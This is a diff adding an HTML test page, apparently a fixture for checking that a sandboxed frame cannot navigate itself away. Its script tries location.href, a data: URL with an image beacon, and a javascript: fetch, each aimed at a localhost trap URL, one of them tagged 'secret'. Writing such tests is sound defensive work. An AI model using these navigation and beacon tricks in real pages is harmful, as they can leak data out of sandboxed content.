@@ -1,0 +1,5 @@
+<!doctype html><html><head><meta charset="utf-8"><title>nav-self</title></head><body><h1>nav-self</h1>
+<script>const who = new URLSearchParams(location.search).get('who'), TRAP = 'http://localhost:8799/' + who;
+parent.postMessage({ type: 'result', result: 'ran' }, '*');
+setTimeout(() => { try { location.href = TRAP + '/self?secret'; } catch (e) {} setTimeout(() => { try { location.replace('data:text/html,<img src=' + TRAP + '/data>'); } catch (e) {} }, 300); setTimeout(() => { try { location = 'javascript:fetch(TRAP)'; } catch (e) {} }, 500); }, 100);
+</script></body></html>
